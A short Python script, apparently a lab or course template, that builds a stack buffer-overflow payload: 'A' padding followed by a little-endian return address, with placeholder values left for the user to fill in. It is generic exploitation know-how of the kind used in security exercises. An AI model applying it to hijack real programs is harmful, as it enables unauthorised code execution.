'''
generates a payload with the binary for repeated 'A's 
followed by the binary for a target address
we will output to the stdout buffer
'''
import sys

########  Enter the payload data below  ###########
# enter the number of bytes we need to write before we
# can overwrite the return address
padding_bytes = 1

#enter the target address for the exploit code
target_address = 0x111111111111

########  Don't edit below this line #########


#The remaining code will formulate the payload in the correct format



padding = b"A"*padding_bytes

little_endian = target_address.to_bytes(8, byteorder='little')

sys.stdout.buffer.write(padding + little_endian + b'\n') 



